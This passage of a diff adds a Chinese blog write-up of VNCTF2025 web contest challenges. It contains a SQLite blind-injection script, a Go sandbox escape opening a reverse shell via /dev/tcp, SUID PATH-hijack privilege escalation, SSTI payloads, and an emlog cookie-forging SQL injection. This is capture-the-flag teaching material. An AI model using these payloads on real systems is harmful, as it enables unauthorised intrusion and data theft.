class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload);<br>        <span class="hljs-type">MyObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210005304971.png" srcset="/img/loading.gif" lazyload alt="image-20250210005304971"></p>
+<p>题目说了不出网，套一个Spring内存马写入byteCode就完事了。</p>
+<p>注意二次反序列化第一次会报构造函数的错，因为没有缓存，这种情况打两次就好了。</p>
+<p>本地：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210005422676.png" srcset="/img/loading.gif" lazyload alt="image-20250210005422676"></p>
+<p>远程：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210005433478.png" srcset="/img/loading.gif" lazyload alt="image-20250210005433478"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44223394/article/details/131696371">fastjson1.2.83反序列化漏洞_fastjson 1.2.83漏洞-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/java/2023/07/24/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-resolveClass.html">Java 反序列化绕过 resolvClass - DumKiy’s blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/369855.html">Fastjson 结合 jdk 原生反序列化的利用手法 ( Aliyun CTF ) - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Avento/MemShell4Spring/blob/main/No2_ControllerHandlerShell.java">MemShell4Spring&#x2F;No2_ControllerHandlerShell.java at main · Avento&#x2F;MemShell4Spring</a></p>
+<h2 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h2><p>Sqlite数据库的时间盲注。</p>
+<p>也能测出waf是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span>,空格,<span class="hljs-operator">=</span>,sleep,bench<br></code></pre></td></tr></table></figure>
+
+<p>但是可以使用<code>randomblob</code>替换。而且<code>/**/</code>也没ban，套一下官方的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://node.vnteam.cn:44824/login&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">500</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span>(low&lt;high):<br>        time.sleep(<span class="hljs-number">0.2</span>)<br>        payload = <span class="hljs-string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(username))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(50000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(mid))<br>        <span class="hljs-comment"># payload= &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(50000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span><br>        <span class="hljs-comment"># payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(300000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span><br><br>        datas = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;eddie&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>: payload<br>        &#125;<br>        <span class="hljs-comment"># print(datas)</span><br>        start_time=time.time()<br>        res = requests.post(url=url,json=datas)<br>        end_time=time.time()<br>        spend_time=end_time-start_time<br>        <span class="hljs-keyword">if</span> spend_time&gt;=<span class="hljs-number">0.19</span>:<br>            low = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span>(mid ==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid ==<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">break</span><br>    flag = flag+<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>+<span class="hljs-built_in">bytes</span>.fromhex(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<p>跑出username和password，但有可能跑错，所以多跑几次：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210144139964.png" srcset="/img/loading.gif" lazyload alt="image-20250210144139964"></p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210144841158.png" srcset="/img/loading.gif" lazyload alt="image-20250210144841158"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nailong/woaipangmao114514<br></code></pre></td></tr></table></figure>
+
+<p>登录获得flag：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210144719548.png" srcset="/img/loading.gif" lazyload alt="image-20250210144719548"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/324785.html">SQLite注入 - FreeBuf网络安全行业门户</a></p>
+<h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h2><p>读取源码，可以发现有任意文件读取路由，key.go没有直接给我们，应该是要我们去读的。</p>
+<p>然后跟一下会发现key.go影响jwt的token生成，有一个&#x2F;eval的执行沙箱代码，但是需要admin的鉴权：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Eval</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	code := c.PostForm(<span class="hljs-string">&quot;code&quot;</span>)<br>	log.Println(code)<br>	<span class="hljs-keyword">if</span> code == <span class="hljs-string">&quot;&quot;</span> &#123;<br>		response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;No code provided&quot;</span>)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	log.Println(containsBannedPackages(code))<br>	<span class="hljs-keyword">if</span> containsBannedPackages(code) &#123;<br>		response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Code contains banned packages&quot;</span>)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	tmpFile, err := ioutil.TempFile(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;goeval-*.go&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		log.Println(<span class="hljs-string">&quot;Error creating temp file:&quot;</span>, err)<br>		response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Error creating temporary file&quot;</span>)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">defer</span> os.Remove(tmpFile.Name())<br><br>	_, err = tmpFile.WriteString(code)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		log.Println(<span class="hljs-string">&quot;Error writing code to temp file:&quot;</span>, err)<br>		response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Error writing code to temp file&quot;</span>)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	cmd := exec.Command(<span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, tmpFile.Name())<br>	output, err := cmd.CombinedOutput()<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		log.Println(<span class="hljs-string">&quot;Error running Go code:&quot;</span>, err)<br>		response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-type">string</span>(output)&#125;, <span class="hljs-string">&quot;Error executing code&quot;</span>)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	response.Success(c, gin.H&#123;<span class="hljs-string">&quot;result&quot;</span>: <span class="hljs-type">string</span>(output)&#125;, <span class="hljs-string">&quot;success&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>关键在这里：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">containsBannedPackages</span><span class="hljs-params">(code <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>	importRegex := <span class="hljs-string">`(?i)import\s*\((?s:.*?)\)`</span><br>	re := regexp.MustCompile(importRegex)<br>	matches := re.FindStringSubmatch(code)<br>	imports := matches[<span class="hljs-number">0</span>]<br>	log.Println(imports)<br>	<span class="hljs-keyword">if</span> strings.Contains(imports, <span class="hljs-string">&quot;os/exec&quot;</span>) &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>	&#125;<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果admin身份进入沙箱，这里会匹配<code>os/exec</code>，不让你外部执行命令。</p>
+<p>但是根本难不倒他，<code>syscall</code>也能打。</p>
+<p>而读取到key.go后，我们能直接拿本地生成的token去套远程环境，因为这里mt_rand伪随机数生成的<code>JWT KEY</code>是唯一的，所以仍然有效。</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210010014143.png" srcset="/img/loading.gif" lazyload alt="image-20250210010014143"></p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210010025744.png" srcset="/img/loading.gif" lazyload alt="image-20250210010025744"></p>
+<p>这里执行：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;log&quot;</span><br>	<span class="hljs-string">&quot;syscall&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	<span class="hljs-comment">// Define the command and arguments</span><br>	cmd := <span class="hljs-string">&quot;/bin/bash&quot;</span><br>	args := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&quot;</span>&#125;<br><br>	<span class="hljs-comment">// Execute the command</span><br>	err := syscall.Exec(cmd, args, <span class="hljs-literal">nil</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		log.Fatalf(<span class="hljs-string">&quot;Error executing command: %v&quot;</span>, err)<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210145941925.png" srcset="/img/loading.gif" lazyload alt="image-20250210145941925"></p>
+<p>反弹shell成功：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210010105078.png" srcset="/img/loading.gif" lazyload alt="image-20250210010105078"></p>
+<p>根目录假flag，suid提权看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>找到个&#x2F;…&#x2F;Cat，只会输出根目录那个假flag。<br>发现&#x2F;…&#x2F;Cat，我们base64给他弄下来逆一下，主逻辑：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210010128026.png" srcset="/img/loading.gif" lazyload alt="image-20250210010128026"></p>
+<p>这里的Cat会执行cat &#x2F;flag拿假flag命令，开始我还没想到，还试了试编译恶意so打LD_PRELOAD，但是失败了。</p>
+<p>后面一搜suid方法，搜到了个环境变量提权的手段，新知识啊：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; /tmp/cat &amp;&amp; <span class="hljs-built_in">chmod</span> +x /tmp/cat<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
+
+<p>大致意思就是，我们在tmp内写一个cat，将&#x2F;bin&#x2F;bash写进去，然后环境变量设置&#x2F;tmp，那么执行这个&#x2F;…&#x2F;Cat时会执行cat，而cat命令就会优先在环境变量寻找，也就是执行了&#x2F;tmp&#x2F;cat，此时就执行到root权限的&#x2F;bin&#x2F;bash而拿到了高权限shell。</p>
+<p>但是直接读&#x2F;root下的flag好像没反应？算了都chmod 777再弹一次就行了：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/308ae036c3b7f36de06fd42201641bdc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a>学生姓名登记系统</h2><p><code>&#123;&#123;7*'7'&#125;&#125;</code>能直接查出python的SSTI，但是限制了长度最大23，而且open被ban了。</p>
+<p>题目其实提示了一行一个名字，应该是用换行来绕这个限制。这里使用<code>%0a</code>就能绕。</p>
+<p>这里的单文件框架其实就是bottle，虽然不太知道，但是知不知道都无所谓，测一测就知道赋值打法能直接常规SSTI一把梭了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;<br>&#123;&#123;b:=a.__class__&#125;&#125;<br>&#123;&#123;c:=b.__base__&#125;&#125;<br>&#123;&#123;d:=c.__subclasses__&#125;&#125;<br>&#123;&#123;e:=d()[<span class="hljs-number">154</span>]&#125;&#125;  <br>&#123;&#123;f:=e.__init__&#125;&#125;<br>&#123;&#123;g:=f.__globals__&#125;&#125;<br>&#123;&#123;h:=g[<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>]&#125;&#125;<br>&#123;&#123;i:=h(<span class="hljs-string">&quot;cat /flag&quot;</span>)&#125;&#125;<br>&#123;&#123;j:=i.read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;%0a&#123;&#123;b:=a.__class__&#125;&#125;%0a&#123;&#123;c:=b.__base__&#125;&#125;%0a&#123;&#123;d:=c.__subclasses__&#125;&#125;%0a&#123;&#123;e:=d()[<span class="hljs-number">154</span>]&#125;&#125;%0a&#123;&#123;f:=e.__init__&#125;&#125;%0a&#123;&#123;g:=f.__globals__&#125;&#125;%0a&#123;&#123;h:=g[<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>]&#125;&#125;%0a&#123;&#123;i:=h(<span class="hljs-string">&quot;cat /flag&quot;</span>)&#125;&#125;%0a&#123;&#123;j:=i.read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但这样直接打好像有点识别问题？而且无回显，测<code>&#123;&#123;print(5)&#125;&#125;</code>就能知道。</p>
+<p>建议发HTTP包打或者hackbar，用open打：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;%0a&#123;&#123;b:=a.__class__&#125;&#125;%0a&#123;&#123;c:=b.__base__&#125;&#125;%0a&#123;&#123;d:=c.__subclasses__&#125;&#125;%0a&#123;&#123;e:=d()[<span class="hljs-number">156</span>]&#125;&#125;%0a&#123;&#123;f:=e.__init__&#125;&#125;%0a&#123;&#123;g:=f.__globals__&#125;&#125;%0a&#123;&#123;z:=<span class="hljs-string">&#x27;__builtins__&#x27;</span>&#125;&#125;%0a&#123;&#123;h:=g[z]&#125;&#125;%0a&#123;&#123;i:=h[<span class="hljs-string">&#x27;op&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>]&#125;&#125;%0a&#123;&#123;x:=i(<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;%0a&#123;&#123;y:=x.read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210153054779.png" srcset="/img/loading.gif" lazyload alt="image-20250210153054779"></p>
+<h2 id="ez-emlog"><a href="#ez-emlog" class="headerlink" title="ez_emlog"></a>ez_emlog</h2><p>据说是个0day。</p>
+<p>分前台登录和后台RCE两步。</p>
+<p>前台登录需要拿到AUTH_KEY，然后SQL注入拿到可用用户名，然后用这个用户名和AUTH_KEY生成可用cookie给CSRF进后台，后台可以上传恶意插件RCE。</p>
+<p>去官方下载它的源码，先审计一下<code>install.php</code>：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210153854027.png" srcset="/img/loading.gif" lazyload alt="image-20250210153854027"></p>
+<p>AUTH_KEY和AUTH_COOKIE_NAME都使用了getRandStr()生成随机序列，跟进：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210154001434.png" srcset="/img/loading.gif" lazyload alt="image-20250210154001434"></p>
+<p>看到了题目提示的mt_rand安全问题，这里只需要获得确定的序列就能破这个伪随机数，预测出AUTH_KEY。</p>
+<p>审计源码能知道获得种子seed有两个方法，第一个是注册用户并登录，但是题目给关了。</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210154434571.png" srcset="/img/loading.gif" lazyload alt="image-20250210154434571"></p>
+<p>继续审计源码，发现logout出去也能set-cookie。</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210154358953.png" srcset="/img/loading.gif" lazyload alt="image-20250210154358953"></p>
+<p>审一下得到访问逻辑，那我们可以先访问action&#x3D;logout路由抓包获取这段cookie拿去爆种子：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210154643999.png" srcset="/img/loading.gif" lazyload alt="image-20250210154643999"></p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210161426050.png" srcset="/img/loading.gif" lazyload alt="image-20250210161426050"></p>
+<p>爆出种子：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">2430606281</span><br></code></pre></td></tr></table></figure>
+
+<p>回到鉴权逻辑：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210161242617.png" srcset="/img/loading.gif" lazyload alt="image-20250210161242617"></p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250210161342127.png" srcset="/img/loading.gif" lazyload alt="image-20250210161342127"></p>
+<p>显然这里可以构造永真式SQL打个报错注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$seed</span> = <span class="hljs-number">2430606281</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-variable">$rand_string</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()&quot;</span>;<br><br><span class="hljs-variable">$retStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">32</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$retStr</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$rand_string</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$rand_string</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$user_agent</span> = <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0&#x27;</span>;<br><span class="hljs-variable">$auth_key</span> = <span class="hljs-variable">$retStr</span>.<span class="hljs-variable">$user_agent</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;AUTH_KEY:&#x27;</span> . <span class="hljs-variable">$auth_key</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;x&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1) #&quot;</span>;<br><span class="hljs-variable">$expiration</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$auth_key</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> .  <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nEM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$expiration</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$hash</span>;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">AUTH_KEY:<span class="hljs-title function_ invoke__">yxuzKkM2QC8L8WLPFvawb</span>(mI4R&amp;NglOAMozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">135.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">135.0</span><br>                               <br>EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=x<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1) #|0|1347191e25f82f5b77b6d5b283ee4064</span><br></code></pre></td></tr></table></figure>
+
+<p>再用得到的用户名生成可用cookie登录后台。</p>
+<p>后续后台上传恶意插件RCE。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9B/" class="print-no-link">#比赛</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>VNCTF2025-WEB</div>
+      <div>https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>EddieMurphy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
